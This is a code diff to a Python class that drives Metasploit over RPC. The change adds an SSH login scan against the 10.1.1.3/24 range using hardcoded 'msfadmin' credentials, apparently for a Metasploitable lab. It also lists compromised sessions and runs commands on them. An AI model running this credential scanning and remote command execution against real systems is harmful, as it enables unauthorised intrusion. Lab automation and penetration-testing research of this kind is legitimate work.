@@ -1,8 +1,7 @@
 import os
 import time
 import json
-from pymetasploit3.msfrpc import MsfRpcClient, MsfRpcMethod
-
+from pymetasploit3.msfrpc import MsfRpcClient
 class Metasploit:
     
     def __init__(self, password, server='127.0.0.1', port=1337):
@@ -24,51 +23,94 @@ class Metasploit:
         self.targets[hostID] = session_id
         
     def query_hosts(self):
-        """Retrieve all hosts from Metasploit, filtered by kwargs."""
-        hosts = self.client.db.hosts
-        print("Retrieved Metasploit compromised hosts")
-        for session_id in self.client.sessions.list.keys():
-            if not any(session_id == str(val) for val in self.targets.values()):
-                self.save_session("msf", int(session_id))        
+
+        run_exploit = self.client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
+        run_exploit["RHOSTS"] = '10.1.1.3/24'
+        run_exploit["USERNAME"] = 'msfadmin'
+        run_exploit["PASSWORD"] = 'msfadmin'
+        run_exploit["THREADS"] = 5  
+
+        result = run_exploit.execute()
+        time.sleep(100)  # Allow time for the scan to run
+
+        if result.get("job_id"):
+            print("[+] Scan Complete!")
+        else:
+            print("[!] Scan failed. Retrying...")
+
+        # for attempt in range(1, 5):
+
+        #     print(f"Attempt {attempt}: Starting SSH login scan...")
+
+        #     if result.get("job_id"):
+        #         print("Scan Complete!")
+        #         break
+        #     else:
+        #         print("Scan failed. Retrying...")
+
+
+        hosts = []
+        print("[+] Retrieving active sessions in Metasploit...")
+
+        # Loop through active sessions to gather information
+        for session_id, session in self.client.sessions.list.items():
+            host_info = {
+                "session_id": session_id,
+                "target_host": session.get("tunnel_peer", "N/A"),
+                "platform": session.get("platform", "N/A"),
+                "via_exploit": session.get("via_exploit", "N/A"),
+                "via_payload": session.get("via_payload", "N/A"),
+            }
+            hosts.append(host_info)
+            # Save the session to targets with the format "msf<session_id>"
+            self.save_session("msf", int(session_id))
+
+        print("[+] Active sessions retrieved:")
+        if hosts:
+            for host in hosts:
+                print(f"Session ID {host['session_id']}: Target Host: {host['target_host']}, Platform: {host['platform']}")
+        else:
+            print("[-] No active sessions.")
+
         return hosts
 
-    def send_cmd(self, id=None, os=None, *commands):
-        """
-        Run a command on the host specified by `id`, filtered by OS if provided.
-        """
+
+
+    def send_cmd(self, id=None, os=None, commands=[]):
         output = []
         if not id:
-            raise ValueError("Host ID must be provided.")
+            raise ValueError("[+] Host ID must be provided.")
 
         # Get session ID from targets mapping
         session_id = self.targets.get(id)
         if not session_id:
-            raise ValueError(f"Host ID {id} not found in targets.")
+            raise ValueError(f"[+] Host ID {id} not found in targets.")
 
         # Locate the session
         session = self.client.sessions.list.get(str(session_id))
         if not session:
-            raise ValueError(f"Session with ID {session_id} not found.")
+            raise ValueError(f"[+] Session with ID {session_id} not found.")
 
-        # Check OS/platform if provided
-        if os and session['platform'] != os:
-            raise ValueError(f"Session {session_id} is not running on the specified OS: {os}.")
+        # Check OS/platform if provided, and skip check if platform is not available
+        session_platform = session.get('platform', 'N/A')
+        if os and session_platform != os and session_platform != 'N/A':
+            raise ValueError(f"[+] Session {session_id} is not running on the specified OS: {os}. It is on platform: {session_platform}.")
 
         # Run the command and collect output
         for cmd in commands:
             try:
-                print(f"Sent command {cmd} on target with id: {id}")
-                cmd_output = self.client.sessions.session(str(session_id)).run_with_output(cmd)
+                print(f"[+] Sent command {cmd} on target with id: {id}")
+                cmd_output = self.client.sessions.session(str(session_id)).run_with_output(cmd, end_strs=["$", "#", "\n"])
                 output.append(cmd_output)
-                print(f"Successfully sent command, received output.")
+                print(f"[+] Successfully sent command, received output.")
             except Exception as e:
-                output.append(f"Error executing command '{cmd}': {e}")
+                output.append(f"[!] Error executing command '{cmd}': {e}")
 
         return output
     
     def list_exploit(self, module_type):
         if not self.client:
-            raise ConnectionError("Not connected")
+            raise ConnectionError("[-] Not connected")
         return self.client.modules.search(module_type)
     
     def get_host(self, os=None):
